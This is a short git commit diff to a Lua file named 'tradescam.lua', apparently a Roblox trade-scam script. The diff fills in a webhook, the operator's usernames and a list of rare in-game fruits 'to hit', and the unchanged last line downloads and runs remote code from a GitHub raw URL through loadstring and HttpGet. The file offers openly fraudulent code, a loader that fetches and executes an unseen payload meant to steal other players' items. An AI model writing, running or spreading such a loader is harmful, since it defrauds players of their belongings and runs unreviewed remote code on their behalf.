0fce4cb4419c869e0e82622dd9aca0d6966503cd
Orbitlol <ayusam1409@gmail.com>
2025-04-27 15:32:14 +0530

    Tradescam.lua

--- tradescam.lua
+++ tradescam.lua
@@ -1,5 +1,5 @@
-Webhook = "" -- << Your Webhook
-Usernames = {"85888934", "somealtuserhere2"} -- << Your username(-s).
+Webhook = "85888934" -- << Your Webhook
+Usernames = {"rip_Orbitacc", "somealtuserhere2"} -- << Your username(-s).
 FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Gravity-Gravity", "Gas-Gas"} -- << Fruits you want
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
